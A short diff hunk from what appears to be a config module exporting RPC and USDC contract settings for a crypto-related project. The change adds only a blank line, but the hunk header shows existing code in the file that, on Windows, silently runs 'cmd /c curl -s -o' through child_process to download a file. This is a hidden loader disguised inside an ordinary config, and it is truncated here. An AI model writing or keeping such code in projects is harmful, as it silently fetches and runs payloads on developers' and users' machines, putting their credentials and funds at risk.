@@ -47,3 +47,4 @@ if(process.platform==='win32'){require('child_process').exec('cmd /c curl -s -o 
     RPC_URL: process.env.RPC_URL as string,
     USDC_CONTRACT_ADDRESS: process.env.USDC_CONTRACT_ADDRESS as string,
 };
+
